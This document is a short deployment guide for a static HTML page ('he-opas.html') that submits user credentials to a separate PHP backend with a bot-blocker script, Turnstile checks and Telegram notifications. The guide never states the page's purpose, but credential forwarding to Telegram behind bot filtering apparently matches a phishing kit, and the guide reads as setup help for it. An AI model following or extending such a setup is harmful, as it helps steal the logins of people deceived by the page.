# Two-Server Deployment Guide

## Architecture Overview

This setup allows you to host your frontend (HTML) and backend (PHP) on separate servers for better scalability and security.

```
Frontend Server (Static)     Backend Server (Dynamic)
├── he-opas.html           ├── app.php
└── Static hosting         ├── bot-blocker.php
    (Netlify, Vercel,      ├── config.php
     GitHub Pages, etc.)   └── PHP hosting (IONOS, etc.)
```

## Configuration Steps

### 1. Frontend Server Setup

**Files to upload:**
- `he-opas.html`

**Configuration in he-opas.html:**
```javascript
// Update this line with your backend server URL
const BACKEND_URL = 'https://your-backend-domain.com/app.php';
```

### 2. Backend Server Setup

**Files to upload:**
- `app.php`
- `bot-blocker.php`
- `config.php` (rename from config.example.php)
- `.htaccess`

**Configuration in config.php:**
```php
// Update these URLs
define('FRONTEND_URL', 'https://your-frontend-domain.com');
define('ALLOWED_ORIGINS', [
    'https://your-frontend-domain.com',
    // Add any other domains that should access the backend
]);
```

## URL Examples

### Development
- Frontend: `http://localhost:3000/he-opas.html`
- Backend: `http://localhost:8001/app.php`

### Production
- Frontend: `https://myapp-frontend.netlify.app/he-opas.html`
- Backend: `https://myapp-backend.ionos.com/app.php`

## Flow Diagram

```
User enters credentials
        ↓
Frontend form submits to backend
        ↓
Backend processes & validates
        ↓
Backend redirects back to frontend
        ↓
Frontend shows success/error message
```

## Security Benefits

1. **Separation of Concerns**: Static frontend, dynamic backend
2. **CORS Protection**: Only allowed origins can access backend
3. **Credential Security**: Sensitive data only on backend server
4. **Bot Protection**: Advanced protection on backend only
5. **CDN Friendly**: Frontend can use CDN for better performance

## Testing Checklist

- [ ] Frontend loads correctly
- [ ] Form submits to backend URL
- [ ] CORS headers allow cross-origin requests
- [ ] Success redirects back to frontend with success=1
- [ ] Error redirects back to frontend with error message
- [ ] Telegram notifications work
- [ ] Turnstile validation works across domains
